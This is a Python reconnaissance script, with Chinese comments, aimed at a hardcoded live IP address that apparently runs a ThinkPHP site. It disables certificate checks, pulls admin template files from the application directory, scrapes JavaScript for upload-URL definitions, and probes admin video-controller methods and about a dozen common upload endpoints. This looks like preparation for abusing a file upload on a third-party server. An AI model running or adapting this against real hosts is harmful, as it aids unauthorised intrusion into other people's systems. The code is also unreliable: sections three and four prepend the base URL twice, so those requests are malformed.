#!/usr/bin/env python3
"""tp_deep4.py - 找上传URL定义(public.js/模板JS) + Video控制器方法"""
import urllib.request, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
BASE = "https://139.196.199.221"

def get(path):
    try:
        r = urllib.request.urlopen(urllib.request.Request(BASE + path, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(150000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(150000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

print("=== 1. 定位__STATIC__目录 ===", flush=True)
# 从模板里找__STATIC__真实路径
st, b = get("/application/admin/view/goods/edit.html")
m = re.search(r'__STATIC__', b)
# TP的__STATIC__通常指向 /public/static 或 /static
for sp in ["/public/static/js/public.js", "/static/js/public.js", "/static/public.js",
           "/public/static/js/upload.js", "/static/js/upload.js", "/public/static/public.js"]:
    st2, b2 = get(sp)
    if st2 == 200 and len(b2) > 100:
        print("  FOUND: %s (size=%d)" % (sp, len(b2)), flush=True)
        # 找上传URL
        for m in re.finditer(r'.{0,60}(?:upload_img_url|upload_url|uploadFile|url\s*[:=]).{0,80}', b2):
            print("    REF: %s" % m.group(0).replace("\n", " ").strip()[:160], flush=True)

print("=== 2. 模板里upload_img_url定义 ===", flush=True)
for t in ["/application/admin/view/goods/edit.html", "/application/admin/view/banner/index.html",
          "/application/admin/view/brand/edit.html", "/application/admin/view/product/index.html"]:
    st, b = get(t)
    if st == 200:
        for m in re.finditer(r'.{0,80}upload_img_url.{0,80}', b):
            print("  %s: %s" % (t.split("/")[-1], m.group(0).replace("\n", " ").strip()[:170]), flush=True)
        for m in re.finditer(r'(?:var|let|const)\s+\w*url\w*\s*=\s*["\'][^"\']+["\']', b):
            print("  URL-DEF %s: %s" % (t.split("/")[-1], m.group(0)[:120]), flush=True)

print("=== 3. Video控制器方法探测 ===", flush=True)
for m in ["index", "list", "add", "edit", "upload", "videoList", "video_list", "delete", "del"]:
    st, b = get(BASE + "/admin/video/%s.html" % m)
    print("  video/%s -> st=%d size=%d" % (m, st, len(b)), flush=True)

print("=== 4. 常见上传接口直接探测 ===", flush=True)
for p in ["/admin/common/upload.html", "/admin/common/uploadImg.html", "/admin/common/upload_img.html",
          "/admin/upload/upload.html", "/admin/video/upload.html", "/admin/file/upload.html",
          "/admin/common/uploadFile.html", "/admin/common/uploadImage.html", "/admin/common/upload.html",
          "/admin/common/uploadimg.html", "/admin/common/upimg.html", "/admin/common/uppic.html"]:
    st, b = get(BASE + p)
    print("  %s -> st=%d size=%d" % (p, st, len(b)), flush=True)

print("=== DONE ===", flush=True)
